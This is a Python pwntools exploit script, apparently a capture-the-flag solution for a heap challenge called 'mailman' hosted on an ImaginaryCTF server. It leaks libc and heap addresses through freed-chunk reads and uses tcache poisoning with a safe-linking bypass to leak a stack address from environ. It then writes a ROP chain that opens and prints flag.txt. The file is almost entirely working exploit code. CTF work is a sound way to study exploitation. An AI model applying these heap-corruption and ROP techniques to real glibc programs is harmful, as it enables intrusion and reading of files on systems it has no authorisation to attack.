from pwn import *
import sys

elf = ELF("vuln_patched")
libc = ELF("libc.so.6")

# io = process(elf.path)
io = remote("mailman.chal.imaginaryctf.org", 1337)

context.arch = 'amd64'
context.terminal = ['tmux', 'splitw', '-h', '-F' '#{pane_pid}', '-P']

# gdb.attach(io, gdb_args=['-ex', 'init-pwndbg'])

def select(c):
    io.sendlineafter(b'> ', c)

def inidx(idx):
    io.sendlineafter(b'idx: ', idx)

def write_letter(idx, sz, ctx):
    select(b'1')
    inidx(idx)
    io.sendlineafter(b'size: ', sz)
    if sz != b'0':
        io.sendlineafter(b'content: ', ctx)

def send_letter(idx):
    select(b'2')
    inidx(idx)

def read_letter(idx):
    select(b'3')
    inidx(idx)
    return io.recvline()

######################
# libc and heap leak #
######################

write_letter(b'0', b'2000', b'cafe')
write_letter(b'1', b'416', b'cafe')

send_letter(b'0')
r = read_letter(b'0')
libc.address = u64(r[:-1].ljust(8, b'\x00')) - 0x219ce0
log.info(f'libc addr: {hex(libc.address)}')

send_letter(b'1')
r = read_letter(b'1')
heap_addr = (u64(r[:-1].ljust(8, b'\x00')) << 12) - 0x2000
log.info(f'heap addr: {hex(heap_addr)}')

#############################
# stack leak from 'environ' #
#############################

# tcache poisoning
def safe_linking(target_addr, self_addr):
    return target_addr ^ (self_addr >> 12)

for i in range(8):
    write_letter(str(i).encode(), b'8', b'cafe')

send_letter(b'7')
send_letter(b'6')

send_letter(b'0')
send_letter(b'1')
send_letter(b'0')

for i in range(7):
    write_letter(str(i).encode(), b'8', b'cafe')
    
write_letter(b'0', b'16', p64(safe_linking(libc.sym["environ"], heap_addr + 0x1fc0)) + p32(0xcafe))
write_letter(b'0', b'8', b'cafe')
write_letter(b'0', b'8', b'cafe')
write_letter(b'0', b'0', b'')
r = read_letter(b'0')
rop_base_addr = u64(r[:-1].ljust(8, b'\x00')) - 0x190
log.info(f'return addr @ {hex(rop_base_addr)}')

####################
# create ROP chain #
####################

# tcache poisoning
for i in range(13):
    write_letter(str(i).encode(), b'100', b'cafe')

for i in range(11):
    send_letter(str(i).encode())

send_letter(b'11')
send_letter(b'12')
send_letter(b'11')

for i in range(7):
    write_letter(str(i).encode(), b'100', b'cafe')

write_letter(b'0', b'100', p64(safe_linking(rop_base_addr - 8, heap_addr + 0x1000)) + p32(0xcafe))
write_letter(b'0', b'100', b'cafe')

stack_pivot_addr = heap_addr + 0x1770
flagtxt_addr = stack_pivot_addr + 0x48
pop_rdi_ret = next(libc.search(asm('pop rdi; ret'), executable=True))
pop_rsi_ret = next(libc.search(asm('pop rsi; ret'), executable=True))
pop_rsp_ret = next(libc.search(asm('pop rsp; ret'), executable=True))
pop_rax_ret = next(libc.search(asm('pop rax; ret'), executable=True))
pop_rdx_r12_ret = next(libc.search(asm('pop rdx; pop r12; ret'), executable=True))
leave_ret = next(libc.search(asm('leave; ret'), executable=True))
syscall_ret = next(libc.search(asm('syscall; ret'), executable=True))
ret = next(libc.search(asm('ret'), executable=True)) 

p = p64(pop_rsi_ret)
p += p64(heap_addr)
p += p64(pop_rdx_r12_ret)
p += p64(0x100)
p += p64(0)
p += p64(libc.sym["read"])
p += p64(pop_rdi_ret)
p += p64(heap_addr)
p += p64(libc.sym["puts"])
p += b'flag.txt\x00'
write_letter(b'0', b'100', p)

p = b'A' * 8
p += p64(pop_rax_ret)
p += p64(2)
p += p64(pop_rdi_ret)
p += p64(flagtxt_addr)
p += p64(pop_rsi_ret)
p += p64(0)
p += p64(syscall_ret)
p += p64(pop_rdi_ret)
p += p64(3)
p += p64(pop_rsp_ret)
p += p64(stack_pivot_addr)

write_letter(b'0', b'100', p)


io.interactive()


